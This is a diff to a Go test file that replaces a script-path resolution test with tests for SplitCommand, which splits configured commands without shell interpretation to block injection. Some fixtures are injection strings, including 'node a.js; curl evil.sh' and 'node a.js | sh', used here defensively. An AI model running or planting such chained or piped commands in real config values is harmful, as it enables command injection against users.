@@ -55,38 +55,46 @@ func TestSeedNeverOverwritesAnEditedAdapter(t *testing.T) {
 	}
 }
 
-// A bare name resolves inside the chat adapters dir; a path wins outright, so
-// a local copy shadows a bundled adapter rather than fighting it.
-func TestResolveChatScript(t *testing.T) {
-	home := t.TempDir()
-	t.Setenv("HOME", home)
-	chatDir, err := ChatAdaptersDir()
-	if err != nil {
-		t.Fatal(err)
-	}
-
+// A command is split the way a person writes it, and NOT the way a shell
+// reads it: the command is executed directly, so a config file must not be
+// able to smuggle a pipe or a command substitution into a process that runs
+// as the owner.
+func TestSplitCommand(t *testing.T) {
 	for _, tc := range []struct {
-		name, in, want string
+		name, in string
+		want     []string
 	}{
-		{"bare name gets .js and the chat dir", "telegram", filepath.Join(chatDir, "telegram.js")},
-		{"bare filename keeps its extension", "telegram.js", filepath.Join(chatDir, "telegram.js")},
-		{"a relative path wins", "./mine/discord.js", "./mine/discord.js"},
-		{"an absolute path wins", "/opt/a/discord.js", "/opt/a/discord.js"},
-		{"a tilde is expanded, because people write them", "~/mine/discord.js", filepath.Join(home, "mine/discord.js")},
+		{"plain", "node telegram.js", []string{"node", "telegram.js"}},
+		{"extra spaces collapse", "node   telegram.js  ", []string{"node", "telegram.js"}},
+		{"double quotes group", `python3 -c "import x; x.run()"`, []string{"python3", "-c", "import x; x.run()"}},
+		{"single quotes group", `node 'my adapter.js'`, []string{"node", "my adapter.js"}},
+		{"one word", "./my-adapter", []string{"./my-adapter"}},
+		// A shell metacharacter is just a character here. It reaches the
+		// child as an argument and is never interpreted, which is the point.
+		{"no shell meaning", "node a.js; curl evil.sh", []string{"node", "a.js;", "curl", "evil.sh"}},
+		{"pipes are literal", "node a.js | sh", []string{"node", "a.js", "|", "sh"}},
+		{"empty quoted arg survives", `node a.js ""`, []string{"node", "a.js", ""}},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
-			got, err := ResolveChatScript(tc.in)
+			got, err := SplitCommand(tc.in)
 			if err != nil {
 				t.Fatal(err)
 			}
-			if got != tc.want {
-				t.Fatalf("ResolveChatScript(%q) = %q, want %q", tc.in, got, tc.want)
+			if len(got) != len(tc.want) {
+				t.Fatalf("SplitCommand(%q) = %q, want %q", tc.in, got, tc.want)
+			}
+			for i := range got {
+				if got[i] != tc.want[i] {
+					t.Fatalf("SplitCommand(%q) = %q, want %q", tc.in, got, tc.want)
+				}
 			}
 		})
 	}
 
-	if _, err := ResolveChatScript(""); err == nil {
-		t.Error("an empty script resolved; it must be an error")
+	for _, bad := range []string{"", "   ", `node "unterminated`} {
+		if _, err := SplitCommand(bad); err == nil {
+			t.Errorf("SplitCommand(%q) succeeded; want an error", bad)
+		}
 	}
 }
 
